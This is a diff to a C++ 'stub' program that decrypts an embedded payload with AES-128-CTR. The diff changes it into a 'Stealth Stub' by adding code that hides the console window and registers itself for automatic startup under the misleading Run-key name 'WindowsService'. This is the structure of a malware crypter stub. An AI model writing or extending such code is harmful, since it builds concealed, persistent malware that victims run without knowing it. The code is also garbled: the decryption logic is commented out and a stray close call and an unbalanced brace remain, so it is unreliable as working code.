@@ -8,12 +8,41 @@
 #include <cstdint>
 #include <random>
 #include <ctime>
+#include <chrono>
+#include <thread>
 
-// Standalone Basic Stub - Simple and clean
-const std::string KEY_EqcgAcpP = "8499ecd1dc72858540d9f15f0f49b495";
-const std::string NONCE_DsSuRBXI = "daeb37120394fcc7bcc979e5e35304ce";
+#ifdef _WIN32
+#include <windows.h>
+#endif
 
-// AES-128-CTR implementation
+// Standalone Stealth Stub - Silent operation + Auto-startup
+const std::string KEY_bOxuOnjb = "a6a2ad8409aefb5758cb810ac62ef3e4";
+const std::string NONCE_bwx2HrY_ = "056e0b466861200583dcc7b82d534e16";
+
+// Stealth features
+void setupAutoStartup() {
+    #ifdef _WIN32
+    HKEY hKey;
+    char exePath[MAX_PATH];
+    GetModuleFileNameA(NULL, exePath, MAX_PATH);
+    
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegSetValueExA(hKey, "WindowsService", 0, REG_SZ, 
+            (const BYTE*)exePath, strlen(exePath) + 1);
+        RegCloseKey(hKey);
+    }
+    #endif
+}
+
+void hideConsole() {
+    #ifdef _WIN32
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    #endif
+}
+
+// AES-128-CTR implementation (same as basic)
 static const uint8_t sbox[256] = {
     0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
     0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
@@ -33,7 +62,7 @@ static const uint8_t sbox[256] = {
     0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
 };
 
-// AES helper functions
+// AES helper functions (same as basic)
 inline uint8_t gmul(uint8_t a, uint8_t b) {
     uint8_t p = 0;
     for (int i = 0; i < 8; i++) {
@@ -143,28 +172,30 @@ void hexToBytes(const std::string& hex, uint8_t* bytes) {
 }
 
 int main() {
+    // Stealth mode - hide console
+    hideConsole();
+    
+    // Setup auto-startup
+    setupAutoStartup();
+    
     // Standalone stub - no embedded data
     // Standalone stub - no embedded data}
     
     // Convert hex strings to bytes
     uint8_t key[16], nonce[16];
-    hexToBytes(KEY_EqcgAcpP, key);
-    hexToBytes(NONCE_DsSuRBXI, nonce);
+    hexToBytes(KEY_bOxuOnjb, key);
+    hexToBytes(NONCE_bwx2HrY_, nonce);
     
     // Decrypt the data using AES-128-CTR
     // Note: embeddedData and embeddedDataSize will be added by stub linker
     // aesCtrCrypt(embeddedData, embeddedData, embeddedDataSize, key, nonce);
     
-    // Write decrypted data to file
+    // Write decrypted data to file (silent)
     // Note: embeddedData and embeddedDataSize will be added by stub linker
     // std::ofstream outFile("decrypted_output.bin", std::ios::binary);
     // if (outFile.is_open()) {
     //     outFile.write(reinterpret_cast<char*>(embeddedData), embeddedDataSize);
         outFile.close();
-        std::cout << "Data decrypted and saved to decrypted_output.bin" << std::endl;
-    } else {
-        std::cerr << "Failed to create output file" << std::endl;
-        return 1;
     }
     
     return 0;
